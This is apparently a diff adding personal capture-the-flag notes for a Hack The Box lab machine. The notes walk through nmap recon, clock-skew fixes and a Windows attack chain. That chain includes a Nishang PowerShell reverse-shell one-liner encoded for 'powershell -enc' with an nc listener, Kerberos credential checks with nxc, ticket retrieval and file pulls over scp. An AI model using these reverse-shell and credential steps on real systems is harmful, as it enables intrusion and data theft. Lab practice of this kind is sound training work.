@@ -1,0 +1,69 @@
+do an nmap scan
+look at ports
+look at the service versions
+look at the clockskew
+
+when adding to /etc/hosts do the sequence in frizzdc.frizz.htb frizzdc frizz.htb
+
+to do clockskew
+sudo ntpdate ipaddress
+
+to decode base 64 
+
+use echo "" | base64 -d
+
+Windows
+    1. nxc "smb" ip address
+    2. click around try to find service versions and php extensions
+    3. look at the network tab for versions as well
+    4. look for version exploits
+        Go to "CVEDetails.com"
+        google for version change log details
+        look for high and criticals before looking at lows and mediums
+
+    5. for reverseshell use "/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1" > shell.ps1 
+        change ip and port to system ip and desired port
+
+        convert to utf-16le format > cat "filename" | iconv -t utf-16le | base64 -w0; echo
+
+    
+
+    6. start nc listner using rlwrap nc -lvnp 9001
+
+    if the reverseshell does not work check the encoding and see if there is a plus separating the strings in the reverseshell and encode it plus
+    also add "powershell+-enc+" after the cmd
+
+    when connecting to mysqlsatabase make sure there is no space between -u and username: -u'username'
+
+    when getting creds from database do a echo -n 'password' | wc -c 
+    echo asd | sha256sum | awk'{print $1}' | wc -c
+
+    if found username and password try again:  nxc smb 10.10.11.60 -k -u 'username' -p 'password'
+    make sure to check for clockskew and do sudo ntpdate ipaddress
+
+    if it works, generate krb file usin: nxc smb 10.10.11.60 -k -u 'username' -p 'password' --generate-krb5-file name
+
+    cp the krb5 file to krb.conf: sudo cp name.krb5 /etc/krb5.conf
+
+    use bloodhound
+    to get TGT ticket use: https://gist.github.com/otterpwn/d8d6c9135f4b9086da6fdea1acecc05e
+    cd d8...
+    do python3 getTGT.py domain/user:password
+    KRB5CCNAME=filename.cache ssh -K f.frizzle@frizz.dc.frizz.htb -v
+    
+    if connection works
+        do a tree , /f
+
+        gci -force will show hidden files
+
+    if trying to cd into  $RECYCLE.BIN, you have to do cd '.\$RECYCLE.BIN'
+
+    Format-Hex is xxd in windows '.\$finename'
+
+    Downloading a file from windows on to linux using 
+    KRB5CCNAME=f.frizzle.ccache scp f.frizzle@frizzdc.frizz.htb:'/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' wapt.7z
+
+    to get file hash if using $filename: get-filehash '.\$RE2XMEG.7z' -alg md5
+
+    dir c:xampp
+    if dir c:xampp fails, then do cp '.\$RE2XMEG.7z' \programdata\wapt.7z  
